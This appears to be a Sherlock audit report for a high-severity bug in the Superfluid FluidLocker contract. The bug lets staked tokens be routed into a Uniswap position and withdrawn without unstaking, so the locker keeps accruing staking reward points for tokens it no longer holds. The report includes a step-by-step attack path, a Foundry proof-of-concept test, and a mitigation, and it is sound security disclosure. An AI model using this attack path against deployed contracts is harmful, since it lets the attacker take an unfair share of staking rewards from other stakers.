---
tags:
  - lang/solidity
  - sector/dex
  - sector/staking
  - sector/staking-pool
  - sector/streaming
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[Superfluid Locker System]]"
auditors:
  - newspacexyz
report: "https://github.com/sherlock-audit/2025-06-superfluid-locker-system-judging"
genome:
  - "[[cross-contract-state-consistency]]"
  - "[[variant]]"
---
# H-1: Staked tokens inside FluidLocker can be withdrawn without calling Unstake

- id: 58281
- impact: HIGH
- protocol: Superfluid Locker System
- reporter: newspacexyz (Sherlock)
- source: N/A

## Summary


This bug report is about a vulnerability found by a group of people in the Superfluid Locker System. The issue is that there is missing validation in a function called `FluidLocker::provideLiquidity`, which allows tokens to be withdrawn after a certain period without properly unstaking them. This means that the staking rewards continue to accumulate even though the tokens are no longer in the contract, causing a loss of integrity in the staking rewards. The root cause of this issue is that the function does not validate against `getAvailableBalance()`, which allows tokens that are currently being staked to be used for providing liquidity. The impact of this bug is that people who take advantage of this vulnerability will receive a majority of the staking rewards, leading to an unfair distribution. The team has fixed this issue in their code, and a test has been provided to demonstrate the exploit. To prevent this from happening in the future, the team has added validation to ensure that the amount of tokens used for liquidity does not exceed the available balance.

## Details

Source: https://github.com/sherlock-audit/2025-06-superfluid-locker-system-judging/issues/177 

## Found by 
0x73696d616f, 0xzey, Angry\_Mustache\_Man, FalseGenius, JeRRy0422, globalace, illoy\_sci, katz, mahdifa, molaratai, nagato, newspacexyz, redbeans, v1c7, zacwilliamson

### Summary

Missing `getAvailableBalance()` validation in `FluidLocker::provideLiquidity` allows staked tokens to be withdrawn after the 6 months tax free period, without every calling `FluidLocker::unstake`. This means the staking rewards will accumulate despite tokens are no longer in the contract, causing a loss of integrity in the staking rewards.

### Root Cause

[FluidLocker::provideLiquidity](https://github.com/sherlock-audit/2025-06-superfluid-locker-system/blob/d8beaeed47f766659a1600a87372a7905109aa3c/fluid/packages/contracts/src/FluidLocker.sol#L420-L444) does not validate against `getAvailableBalance()`, allowing tokens that are currently being staked to be used for `provideLiquidity`

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. Locker owner calls FluidLocker::stake to stake all available tokens inside the locker.
2. Locker owner calls FluidLocker::provideLiquidity to create a uniswap position with these staked tokens. Note that tokens are already transferred outside of the locker at this step.
3. Locker owner calls FluidLocker::withdrawLiquidity after 6 months to trigger the tax free withdraw path. The tokens used to provide liquidity are now in Locker owner's address. However, the locker still believes they are being staked.

### Impact

The staking reward points indefinitely accumulate even though the staked tokens are long gone from the contract. Since there is no upper limit on the staking amount, this leads to the loss of integrity in the staker rewards pool. People who gain "free points" will receive the vast majority shares in future staking reward distribution.

### PoC

Place the following test inside `FluidLockerTest` contract, which is located in `FluidLocker.t.sol`
```solidity
    function testWithdrawWithoutUnstake()
    external
    virtual
    {
        uint fundingAmount = 100e18;
        // Set up Alice's Locker to be functional
        // i. e. not revert due to "lack of funds", "no LP pool units", "no staker pool units", etc.
        _helperFundLocker(address(aliceLocker), fundingAmount);
        _helperLockerStake(address(bobLocker));
        _helperLockerProvideLiquidity(address(carolLocker));

        vm.startPrank(ALICE);
        aliceLocker.stake(fundingAmount); //Stake all avaialble tokens
        aliceLocker.provideLiquidity{ value: fundingAmount / (2 * 9900) }(100e18); //Provide liquidity using the staked tokens
        vm.stopPrank();
        //warp forward to tax free withdrawn time
        vm.warp(block.timestamp + FluidLocker(payable(address(aliceLocker))).TAX_FREE_WITHDRAW_DELAY());

        //alice withdraw liquidity and closes position
        uint256 positionTokenId = _nonfungiblePositionManager.tokenOfOwnerByIndex(
            address(aliceLocker), FluidLocker(payable(address(aliceLocker))).activePositionCount() - 1
        );
        (,,,,,,, uint128 positionLiquidity,,,,) = _nonfungiblePositionManager.positions(positionTokenId);
        (uint256 amount0ToRemove, uint256 amount1ToRemove) = _helperGetAmountsForLiquidity(_pool, positionLiquidity);
        vm.prank(ALICE);
        aliceLocker.withdrawLiquidity(positionTokenId, positionLiquidity, amount0ToRemove, amount1ToRemove);

        // Check that most of contract's fluid tokens are moved to Alice's address
        // Despite us never calling unstake()
        assertApproxEqAbs(fundingAmount,
            _fluidSuperToken.balanceOf(address(ALICE)),
            fundingAmount * 5 / 100 // 5% tolerance
        );
        assertApproxEqAbs(0,
            _fluidSuperToken.balanceOf(address(aliceLocker)),
            fundingAmount * 5 / 100 // 5% tolerance
        );
        // Check that aliceLocker still believes that 100e18 tokens are staked inside it
        assertEq(aliceLocker.getStakedBalance(), fundingAmount);
        // Check that getAvailableBalance reverts because locker balance is less than staked amount
        vm.expectRevert();
        aliceLocker.getAvailableBalance();
    }
```

### Mitigation

Validate that the amount of tokens used to provide liquidity should never exceed getAvailableBalance()

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/superfluid-finance/fluid/pull/26
